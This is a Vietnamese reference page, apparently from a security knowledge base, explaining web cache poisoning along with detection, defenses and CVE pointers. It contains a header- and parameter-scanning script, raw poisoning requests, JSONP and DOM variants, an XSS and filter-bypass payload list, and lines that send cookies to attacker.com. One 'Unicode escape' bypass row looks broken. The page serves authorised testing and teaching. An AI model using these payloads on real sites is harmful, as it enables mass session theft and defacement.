# Web Cache Poisoning

> Đầu độc các phản hồi đã cache để người dùng khác nhận nội dung do kẻ tấn công kiểm soát. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/web_chace_poisoning.md`](../../../../Troubleshooting_Guide/web_chace_poisoning.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A05:2021 Misconfiguration
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Web cache poisoning là một cuộc tấn công trong đó kẻ tấn công lưu một phản hồi độc hại vào một cache dùng chung để nó được phục vụ cho người dùng khác. Kẻ tấn công khiến nội dung độc hại được cache dưới một URL bình thường, biến một lần tiêm đơn lẻ thành lần ảnh hưởng tới mọi khách truy cập chạm tới cache key đó.

## Cơ chế hoạt động (How it works)
Các cache quyết định lưu gì bằng một "cache key" — thường là URL cộng một vài header. Bất kỳ input nào ảnh hưởng tới phản hồi nhưng *không* thuộc key (một input "unkeyed" — ví dụ `X-Forwarded-Host`, một cookie, hoặc một tham số query không thuộc key) đều có thể bị lạm dụng: kẻ tấn công gửi một request mà input unkeyed của nó gây ra một phản hồi độc hại, cache lưu nó dưới key lành tính, và những người dùng kế tiếp yêu cầu cùng key đó nhận phản hồi đã bị đầu độc. Nội dung được tiêm thường là một nguồn script, đích redirect, hoặc markup được phản chiếu dẫn tới XSS.

## Tác động (Impact)
Vì phản hồi bị đầu độc được phục vụ cho mọi người dùng cache key đó, một request đơn lẻ có thể đưa XSS, redirect độc hại, hoặc bôi nhọ (defacement) ở quy mô lớn — đánh cắp phiên và thông tin xác thực từ nhiều nạn nhân, hoặc gây từ chối dịch vụ trên diện rộng. Mức độ nghiêm trọng thường cao tới nghiêm trọng do bán kính ảnh hưởng rộng và dai dẳng.

## Cách phát hiện (How to detect)
- Fuzz các header (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `Forwarded`, v.v.) và các tham số với một canary duy nhất; nếu canary phản chiếu trong phản hồi *và* một request sạch theo sau cũng trả về nó, thì input là unkeyed và đầu độc được cache.
- Quan sát các header trạng thái cache (`X-Cache`, `Age`, `CF-Cache-Status`) để xác nhận một phản hồi bị đầu độc trở thành HIT được phục vụ cho người khác; dùng một cache buster khi dò để bạn không đầu độc các key đang hoạt động.
- Tìm các khiếm khuyết cache-key: parameter cloaking (dấu phân tách `;`) và các tham số body "fat GET" mà cache bỏ qua nhưng backend lại tôn trọng.

## Khai thác (tóm tắt) (Exploitation)
Phát hiện một input unkeyed được phản chiếu vào phản hồi, rồi tạo một request tiêm nội dung độc hại (script include, redirect, hoặc markup) và xác nhận nó được cache qua `X-Cache: hit`. Mục bị đầu độc sau đó được phục vụ cho mọi người dùng của cache key đó. Dùng cache buster khi kiểm thử và chỉ đầu độc key thật khi đã xác nhận. Payload đầy đủ và các cách bypass nằm trong mục Payload.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Mẫu tấn công (Attack pattern)
1. Tìm một input **unkeyed** — một header, cookie, hoặc tham số không thuộc cache key.
2. Khiến input đó được phản chiếu vào phản hồi (script src, attribute, JSONP callback, v.v.).
3. Đầu độc cache với một phản hồi độc hại (xác nhận qua `X-Cache: hit`).
4. Mọi người dùng kế tiếp của cache key đó nhận phản hồi bị đầu độc.

### Phát hiện (Discovery)
Quét header và tham số để tìm các input unkeyed được phản chiếu. Dùng Param Miner trong Burp, hoặc:

```python
import requests
TARGET = "https://target.com"

for header in ['X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Forwarded-For',
               'X-Host', 'X-Original-URL', 'X-Rewrite-URL', 'Forwarded', 'True-Client-IP']:
    if 'canary-12345' in requests.get(TARGET, headers={header: 'canary-12345'}).text:
        print(f"[+] {header} reflected")
        if 'canary-12345' in requests.get(TARGET).text:
            print(f"[!] VULNERABLE: {header} poisons the cache")

for param in ['utm_content', 'utm_source', 'utm_campaign', 'callback', 'jsonp', 'debug', 'lang']:
    val = f"test_{param}_12345"
    if val in requests.get(f"{TARGET}?{param}={val}").text and val in requests.get(TARGET).text:
        print(f"[!] VULNERABLE: {param} is UNKEYED")
```

Các header đáng fuzz: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-For`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, `True-Client-IP`, `CF-Connecting-IP`, `X-Real-IP`. Các tham số unkeyed phổ biến: `utm_content`, `utm_source`, `utm_campaign`, `utm_medium`, `callback`, `jsonp`, `debug`, `test`, `lang`, `locale`, `redirect`, `return_url`.

### Đầu độc qua header unkeyed (Unkeyed-header poisoning)
Một `X-Forwarded-Host` được phản chiếu cho phép bạn trỏ một script include tới máy chủ của mình.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.net
```

Trang sau đó tải `<script src="//exploit-server.net/resources/js/tracking.js"></script>`; đặt `alert(document.cookie);` ở đó và chờ `X-Cache: hit`.

Nối chuỗi hai header để đầu độc một đích redirect:

```http
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-server.net
```

`X-Forwarded-Scheme: http` (không phải https) kích hoạt một 302 mà `Location` của nó do `X-Forwarded-Host` kiểm soát. Một header chưa biết tìm được qua Param Miner (ví dụ `X-Host`) hành xử tương tự; nếu phản hồi mang theo `Vary: User-Agent`, hãy rò rỉ chính xác UA của nạn nhân trước rồi phát lại nó để mục bị đầu độc được phục vụ cho họ.

### Đầu độc qua cookie unkeyed (Unkeyed cookie poisoning)
Một giá trị cookie được phản chiếu thoát ra khỏi một chuỗi JS. Dùng một cache buster (`?cb=`) khi kiểm thử, rồi gỡ bỏ nó.

```http
GET /?cb=123 HTTP/1.1
Host: vulnerable-site.com
Cookie: fehost=prod"-alert(1)-"prod
```

Được phản chiếu thành `var config = {"host": "prod"-alert(1)-"prod"};`.

### Đầu độc qua query-string / tham số unkeyed (Unkeyed query-string / parameter poisoning)
Một tham số được phản chiếu thoát ra khỏi một attribute (thường là `<link rel="canonical">`). Dùng một header không thuộc key như `Origin` làm cache buster lúc kiểm thử.

```http
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
Origin: cache-buster-value
```

```html
<link rel="canonical" href="/?evil='/><script>alert(1)</script>"/>
```

Tương tự cũng hoạt động qua một tham số unkeyed đã phát hiện như `utm_content`:

```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
```

Các sink query-string hữu ích khác:

```http
GET /?q=http://evil.com HTTP/1.1        # meta-refresh redirect
GET /?q=//evil.com HTTP/1.1             # open redirect
GET /?q=javascript:alert(1) HTTP/1.1    # DOM XSS sink
```

### Khiếm khuyết cache-key (cloaking, fat GET) (Cache-key flaws)
Khiến cache khóa theo một giá trị lành tính trong khi backend hành động theo một giá trị độc hại.

Parameter cloaking với dấu phân tách `;` — cache coi đó là một tham số, backend tách ra và `callback` thứ hai thắng:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert(1) HTTP/1.1
Host: vulnerable-site.com
```

Fat GET — tham số body ghi đè tham số query, nhưng cache key bỏ qua body:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: vulnerable-site.com
Content-Length: 23

callback=alert(1)
```

Cả hai đều cho ra `alert(1)({"country": "UK"})`.

Các biến thể JSONP callback:

```javascript
callback=alert(1)                          // alert(1)({...})
callback=eval(atob('YWxlcnQoMSk='))        // eval(atob('alert(1)'))({...})
callback=alert;alert(1)                    // no-parens chaining
```

### Đầu độc dựa trên DOM / đa giai đoạn (DOM-based / multi-stage poisoning)
Khi trang fetch JSON mà URL của nó được dựng từ một header unkeyed, hãy đầu độc cache để trỏ tới JSON của kẻ tấn công.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.net
```

```json
{ "country": "<img src=1 onerror=alert(document.cookie) />" }
```

Đa giai đoạn: nhắm vào một biến thể được bản địa hóa (khóa theo `Cookie: lang=es`) và đầu độc nguồn cấp bản dịch của nó:

```http
GET /?localized=1 HTTP/1.1
Host: vulnerable-site.com
Cookie: lang=es
X-Forwarded-Host: exploit-server.net
```

```json
{ "es": { "translations": { "View details": "</a><img src=1 onerror='alert(document.cookie)' />" } } }
```

### Payload XSS & bypass bộ lọc (XSS payloads & filter bypass)
Các body tiêm một khi điểm phản chiếu đã được xác nhận:

```html
<img src=1 onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<script>alert(1)</script>
<script>/*">*/alert(1)/*"</script>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Trích xuất dữ liệu một khi mã chạy trong trình duyệt của nạn nhân:

```html
<script>fetch('https://attacker.com/log?c=' + encodeURIComponent(document.cookie));</script>
<script>document.location = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);</script>
```

| Bypass bộ lọc | Payload |
|---------------|---------|
| Làm rối chữ hoa/thường | `<iMg sRc=1 oNeRrOr=alert(1)>` |
| Thực thể HTML cho `=` | `<img src=1 onerror&#x3D;alert(1)>` |
| Null byte | `<img src=1 onerror\x00=alert(1)>` |
| Tab giữa attr và `=` | `<img src=1 onerror\t=alert(1)>` |
| Xuống dòng | `<img src=1 onerror\n=alert(1)>` |
| Unicode escape | `<img src=1 onerroralert(1)>` |

## Phòng chống (Defenses)
1. Đưa mọi input ảnh hưởng tới phản hồi vào cache key, hoặc loại bỏ/chuẩn hóa các input unkeyed (header, cookie, tham số) trước khi chúng đến được ứng dụng.
2. Tắt hỗ trợ cho các header chuyển tiếp/ghi đè mà bạn không thực sự cần (`X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, v.v.) tại cache và origin.
3. Đánh dấu các phản hồi thực sự động hoặc chịu ảnh hưởng của người dùng là không thể cache được (`Cache-Control: no-store`).
4. Giải quyết các khác biệt phân tích giữa cache-key và backend — xử lý dấu phân tách tham số và body request nhất quán để "parameter cloaking" và "fat GET" không thể làm desync key.
5. Tránh phản chiếu input của request vào các phản hồi đã cache; nếu không thể tránh, hãy mã hóa chúng theo ngữ cảnh để một giá trị bị đầu độc không thể trở thành markup thực thi được.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Web+Cache+Poisoning
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Web+Cache+Poisoning
- **Exploit-DB** — https://www.exploit-db.com/search?q=Web+Cache+Poisoning
- **GitHub Advisories** — https://github.com/advisories?query=Web+Cache+Poisoning
- **OSV** — https://osv.dev/list?q=Web+Cache+Poisoning
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `Web Cache Poisoning <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2021-23336` — Vấn đề parameter-cloaking trong `urllib.parse` của Python (dấu chấm phẩy làm dấu phân tách) cho phép web cache poisoning / parameter smuggling.
- _Nghiên cứu kinh điển: "Practical Web Cache Poisoning" (2018) và "Web Cache Entanglement" (2020) của James Kettle ghi lại các kỹ thuật unkeyed-input và cache-key định hình trong thực tế, bao gồm việc đầu độc các site lớn qua `X-Forwarded-Host` và các header tương tự._
- _Nhiều trường hợp cụ thể được báo cáo theo từng sản phẩm/CDN qua bug bounty; hãy tìm trên NVD và GitHub Advisories với tên sản phẩm cộng "cache poisoning" để có các ID đã được kiểm chứng._

## Tham khảo (References)
- PortSwigger Web Security Academy — Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning
- OWASP — Cache Poisoning (community attack page): https://owasp.org/www-community/attacks/Cache_Poisoning
- RFC 9111 — HTTP Caching (cache keys, cacheability, and `Vary`).
